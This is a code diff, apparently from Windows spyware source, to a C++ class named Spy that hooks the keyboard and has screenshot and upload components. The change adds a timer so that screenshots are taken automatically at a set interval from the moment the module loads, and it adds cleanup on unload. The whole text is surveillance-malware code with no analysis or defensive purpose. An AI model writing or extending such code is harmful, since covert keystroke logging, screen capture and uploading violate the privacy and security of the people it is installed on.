@@ -5,8 +5,10 @@
 #include "screenshot.h"
 #include "task.h"
 #include "uploader.h"
+#include "timer.h"
 
 HANDLE Spy::mutex = NULL;
+Timer * Spy::scrot_timer = NULL;
 
 void Spy::lock()
 {
@@ -92,6 +94,8 @@ DWORD Spy::upload_async(LPVOID * dir_path)
 DWORD Spy::load(HINSTANCE hinstance)
 {
 	mutex = CreateMutexA(NULL, false, NULL);
+	scrot_timer = new Timer(SPY_TMR_CAPSCR_INTERVAL, take_screenshot);
+	scrot_timer->start();
 	return KBHook::load(hinstance);
 }
 
@@ -99,6 +103,8 @@ void Spy::unload()
 {
 	KBHook::unload();
 	CloseHandle(mutex);
+	scrot_timer->stop(false);
+	delete scrot_timer;
 }
 
 void Spy::take_screenshot()
